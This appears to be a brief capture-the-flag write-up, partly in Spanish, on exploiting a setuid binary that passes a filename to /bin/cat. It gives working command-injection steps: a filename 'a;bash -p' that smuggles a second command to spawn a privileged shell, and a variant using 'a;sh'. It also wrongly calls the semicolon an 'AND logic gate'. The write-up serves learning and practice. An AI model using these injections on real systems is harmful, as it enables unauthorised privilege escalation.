This one was very good, and i did not know how to exploit the binary, so i had to look it up :(

I'll explain
	
	They gives us a sutUID binary which prints the context of a filename
		the binary makes a syscall at /bin/cat to print the context,
		  but hence we can take advantage of that we can specify a file
			without things inside followed by an AND logic gate and a command


	1) touch "a;bash -p"
		-> -p para que atienda al setuid del owner
	
	2) ./printfile "a;bash -p"
		-> meme: *"we're in"*

	We can spawn a shell this way also:

		-> "a;sh"
